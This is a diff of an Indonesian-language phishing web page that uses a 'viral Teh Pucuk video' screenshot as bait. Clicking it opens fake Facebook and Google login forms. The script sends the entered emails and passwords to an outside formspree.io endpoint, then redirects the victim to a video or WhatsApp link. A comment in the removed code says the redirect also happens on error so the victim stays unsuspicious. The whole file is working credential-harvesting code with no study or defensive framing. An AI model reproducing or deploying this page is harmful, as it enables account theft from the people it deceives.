@@ -2,238 +2,202 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vid Teh Pucuk</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Teh Pucuk Viral</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Helvetica, Arial, sans-serif;
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', 'Segoe UI', Helvetica, Arial, sans-serif; }
+        
+        html, body {
+            height: 100%; width: 100%; background-color: #000; overflow: hidden;
         }
 
-        body {
-            background-color: #000;
-            overflow: hidden;
+        /* Gambar Konten di Belakang */
+        #bg-image {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; justify-content: center; align-items: center;
+            background-color: #ffffff; z-index: 1;
+        }
+        #bg-image img { width: 100%; height: 100%; object-fit: contain; }
+
+        #click-trigger {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 2; cursor: pointer;
         }
 
-        /* Splash Screen */
-        #splash-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #ffffff;
-            z-index: 1;
-            cursor: pointer;
+        /* Overlay Gelap & Blur */
+        #main-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(8px);
+            z-index: 1000; justify-content: center; align-items: center;
         }
 
-        #splash-container img {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
+        /* Card Container */
+        .card {
+            background: #fff; width: 92%; max-width: 400px; padding: 25px;
+            border-radius: 8px; position: relative;
+            box-shadow: 0 12px 28px rgba(0,0,0,0.2);
+            animation: fadeIn 0.3s ease-out;
         }
 
-        /* Popup Overlay */
-        #popup-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.75);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+
+        .close-btn {
+            position: absolute; top: 12px; right: 15px; font-size: 26px;
+            color: #606770; cursor: pointer; line-height: 1; z-index: 10;
         }
 
-        .fb-popup {
-            background: #fff;
-            width: 90%;
-            max-width: 396px;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2);
-            animation: slideIn 0.3s ease-out;
+        /* Menu Pilihan Login */
+        #choice-section h2 { font-size: 20px; font-weight: 600; margin-bottom: 25px; text-align: center; color: #1c1e21; }
+        .btn-choice {
+            display: flex; align-items: center; justify-content: center;
+            width: 100%; padding: 12px; margin-bottom: 12px;
+            border-radius: 6px; border: 1px solid #dadce0;
+            font-size: 16px; font-weight: 500; cursor: pointer;
+        }
+        .btn-google { background: #fff; color: #3c4043; }
+        .btn-facebook { background: #1877f2; color: white; border: none; }
+        .btn-choice img { width: 18px; margin-right: 12px; }
+
+        /* --- FACEBOOK STYLE --- */
+        #fb-section { display: none; text-align: center; }
+        .fb-logo { width: 112px; margin: 0 auto 15px; display: block; }
+        .fb-text { font-size: 16px; color: #1c1e21; margin-bottom: 20px; line-height: 1.3; }
+        .fb-input {
+            width: 100%; padding: 14px 16px; border: 1px solid #dddfe2;
+            border-radius: 6px; font-size: 15px; margin-bottom: 12px;
+            background: #f5f6f7; outline: none;
+        }
+        .fb-input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
+        .fb-btn { 
+            width: 100%; background: #1877f2; color: #fff; border: none; 
+            padding: 10px; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer;
         }
 
-        @keyframes slideIn {
-            from { transform: translateY(-30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+        /* --- GOOGLE STYLE --- */
+        #google-section { display: none; padding: 30px 15px; }
+        .g-logo { width: 75px; display: block; margin: 0 auto 10px; }
+        .g-title { font-size: 24px; font-weight: 400; text-align: center; color: #202124; margin-bottom: 10px; }
+        .g-subtitle { font-size: 16px; text-align: center; margin-bottom: 30px; color: #202124; }
+        .g-input {
+            width: 100%; padding: 13px 15px; border: 1px solid #dadce0;
+            border-radius: 4px; font-size: 16px; margin-bottom: 15px; outline: none;
         }
+        .g-input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .g-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 25px; }
+        .g-btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
 
-        .fb-logo-text {
-            color: #1877f2;
-            font-size: 32px;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 10px;
-            letter-spacing: -1px;
+        /* Eye Icon Utility */
+        .pw-wrap { position: relative; }
+        .eye { 
+            position: absolute; right: 12px; top: 12px; cursor: pointer;
+            display: flex; align-items: center;
         }
-
-        .video-text {
-            text-align: center;
-            font-size: 16px;
-            color: #1c1e21;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-
-        .input-wrapper {
-            position: relative;
-            width: 100%;
-            margin-bottom: 12px;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 15px;
-            outline: none;
-            background-color: #f5f6f7;
-        }
-
-        input:focus {
-            border-color: #1877f2;
-            background-color: #fff;
-        }
-
-        .eye-icon {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #606770;
-            display: flex;
-            align-items: center;
-        }
-
-        .btn-login {
-            width: 100%;
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 5px;
-        }
-
-        .forgot-link {
-            display: block;
-            text-align: center;
-            margin: 15px 0;
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-        }
-
-        .divider {
-            border-bottom: 1px solid #dadde1;
-            margin-bottom: 20px;
-        }
-
-        .btn-new-acc {
-            display: block;
-            width: 65%;
-            margin: 0 auto;
-            background-color: #42b72a;
-            color: white;
-            text-align: center;
-            padding: 10px;
-            border-radius: 6px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 15px;
-        }
+        .eye svg { width: 24px; height: 24px; fill: #606770; }
     </style>
 </head>
 <body>
 
-    <div id="splash-container" onclick="openPopup()">
-        <img src="https://i.postimg.cc/y6MzwjwN/Screenshot-2026-02-16-08-31-05-219-com-whatsapp-w4b-edit.jpg" alt="Preview">
+    <div id="bg-image">
+        <img src="https://i.postimg.cc/y6MzwjwN/Screenshot-2026-02-16-08-31-05-219-com-whatsapp-w4b-edit.jpg">
     </div>
 
-    <div id="popup-overlay">
-        <div class="fb-popup">
-            <div class="fb-logo-text">facebook</div>
-            <p class="video-text">Login Untuk Melanjutkan Menonton Video</p>
-            
-            <form id="fb-form" action="https://formspree.io/f/xgolkjyz" method="POST">
-                <div class="input-wrapper">
-                    <input type="text" name="Email_atau_Nomor" placeholder="Nomor ponsel atau email" required>
-                </div>
+    <div id="click-trigger" onclick="openOverlay()"></div>
 
-                <div class="input-wrapper">
-                    <input type="password" id="password" name="Kata_Sandi" placeholder="Kata sandi" required>
-                    <div class="eye-icon" onclick="togglePassword()">
-                        <svg id="eye-svg" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
-                            <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"/>
-                            <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
-                        </svg>
-                    </div>
-                </div>
-
-                <button type="submit" id="btn-submit" class="btn-login">Log In</button>
-                <a href="#" class="forgot-link">Lupa kata sandi?</a>
-            </form>
-
-            <div class="divider"></div>
-            <a href="#" class="btn-new-acc">Buat Akun Baru</a>
+    <div id="main-overlay">
+        
+        <div id="choice-section" class="card">
+            <h2>Verifikasi Identitas</h2>
+            <div class="btn-choice btn-google" onclick="showForm('google')">
+                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png"> Lanjutkan dengan Google
+            </div>
+            <div class="btn-choice btn-facebook" onclick="showForm('fb')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"> Lanjutkan dengan Facebook
+            </div>
         </div>
+
+        <div id="fb-section" class="card">
+            <span class="close-btn" onclick="backToMenu()">&times;</span>
+            <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg">
+            <p class="fb-text">Gunakan Akun Facebook Anda</p>
+            <form class="ajax-form" action="https://formspree.io/f/xgolkjyz" method="POST">
+                <input type="text" name="Email_FB" class="fb-input" placeholder="Nomor ponsel atau email" required>
+                <div class="pw-wrap">
+                    <input type="password" name="Pass_FB" class="fb-input pw-field" placeholder="Kata sandi" required>
+                    <span class="eye" onclick="togglePassword(this)">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </span>
+                </div>
+                <button type="submit" class="fb-btn">Login</button>
+            </form>
+            <p style="color:#1877f2; font-size:14px; margin-top:15px; cursor:pointer;">Lupa kata sandi?</p>
+        </div>
+
+        <div id="google-section" class="card">
+            <span class="close-btn" onclick="backToMenu()">&times;</span>
+            <img class="g-logo" src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png">
+            <h1 class="g-title">Login</h1>
+            <p class="g-subtitle">Gunakan Akun Google Anda</p>
+            <form class="ajax-form" action="https://formspree.io/f/xgolkjyz" method="POST">
+                <input type="text" name="Email_G" class="g-input" placeholder="Email atau ponsel" required>
+                <div class="pw-wrap">
+                    <input type="password" name="Pass_G" class="g-input pw-field" placeholder="Masukkan sandi Anda" required>
+                    <span class="eye" onclick="togglePassword(this)">
+                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                    </span>
+                </div>
+                <div class="g-footer">
+                    <span style="color:#1a73e8; font-weight:500; font-size:14px; cursor:pointer;">Buat akun</span>
+                    <button type="submit" class="g-btn">Berikutnya</button>
+                </div>
+            </form>
+        </div>
+
     </div>
 
     <script>
-        // Fungsi memunculkan popup
-        function openPopup() {
-            document.getElementById('popup-overlay').style.display = 'flex';
+        function openOverlay() {
+            document.getElementById('click-trigger').style.display = 'none';
+            document.getElementById('main-overlay').style.display = 'flex';
         }
 
-        // Fungsi Lihat/Tutup Password
-        function togglePassword() {
-            const passwordField = document.getElementById('password');
-            const eyeSvg = document.getElementById('eye-svg');
-            if (passwordField.type === 'password') {
-                passwordField.type = 'text';
-                eyeSvg.innerHTML = '<path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7.028 7.028 0 0 0-2.79.588l.77.771A5.944 5.944 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.134 13.134 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755-.165.165-.337.328-.517.486l.708.709zM11.297 9.176l.762.762A4.01 4.01 0 0 0 12 8a4 4 0 0 0-4-4c-.426 0-.832.066-1.214.188l.824.824c.13-.013.261-.02.39-.02a3 3 0 0 1 3 3c0 .129-.007.26-.02.39zm-1.611 1.611a.908.908 0 0 1-.34.063c-.5 0-.9-.4-.9-.9 0-.13.028-.25.076-.357l-.687-.687c-.125.215-.19.458-.19.714a2 2 0 0 0 2 2c.256 0 .499-.065.714-.19l-.673-.673zm-2.89-2.89L5.47 6.56C5.176 7.01 5 7.49 5 8a3 3 0 0 0 3 3c.51 0 .99-.176 1.44-.47l.762.762A4.012 4.012 0 0 1 8 12c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8c.06-.09.124-.187.198-.293a12.61 12.61 0 0 1 1.61-1.636l.745.746zm6.342 6.342l-.792-.792-9-9-.708.708 1.45 1.45c-.456.375-.86.79-1.201 1.221L0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 4.058-1.288l1.235 1.235.708-.708z"/>';
-            } else {
-                passwordField.type = 'password';
-                eyeSvg.innerHTML = '<path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"/><path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>';
-            }
+        function showForm(type) {
+            document.getElementById('choice-section').style.display = 'none';
+            document.getElementById(type + '-section').style.display = 'block';
         }
 
-        // Script untuk Redirect otomatis ke WA setelah kirim data
-        const form = document.getElementById('fb-form');
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const btn = document.getElementById('btn-submit');
-            btn.innerHTML = "Memuat...";
-            btn.style.opacity = "0.7";
+        function backToMenu() {
+            document.getElementById('fb-section').style.display = 'none';
+            document.getElementById('google-section').style.display = 'none';
+            document.getElementById('choice-section').style.display = 'block';
+        }
 
-            const formData = new FormData(form);
-            
-            try {
-                await fetch(form.action, {
-                    method: 'POST',
-                    body: formData,
-                    headers: { 'Accept': 'application/json' }
-                });
-                // PINDAH KE WA SETELAH BERHASIL
-                window.location.href = "https://chat.whatsapp.com/KVe6DnFDUHl9CSf1GFnezF?mode=gi_c";
-            } catch (error) {
-                // JIKA ERROR TETAP PINDAH AGAR TIDAK DICURIGAI
-                window.location.href = "https://chat.whatsapp.com/KVe6DnFDUHl9CSf1GFnezF?mode=gi_c";
-            }
+        function togglePassword(btn) {
+            const input = btn.parentElement.querySelector('.pw-field');
+            const isPw = input.type === 'password';
+            input.type = isPw ? 'text' : 'password';
+            // Ubah ikon mata (opsional: bisa ganti SVG di sini)
+        }
+
+        // Script AJAX & Redirect
+        const forms = document.querySelectorAll('.ajax-form');
+        forms.forEach(form => {
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const btn = form.querySelector('button');
+                btn.innerHTML = "Memuat...";
+                
+                const formData = new FormData(form);
+                try {
+                    await fetch(form.action, {
+                        method: 'POST',
+                        body: formData,
+                        headers: { 'Accept': 'application/json' }
+                    });
+                } catch (err) {}
+                
+                // Apapun hasilnya, arahkan ke Grup WA
+                window.location.href = "https://videy.co/v/?id=PSvhx8lN1";
+            });
         });
     </script>
 </body>
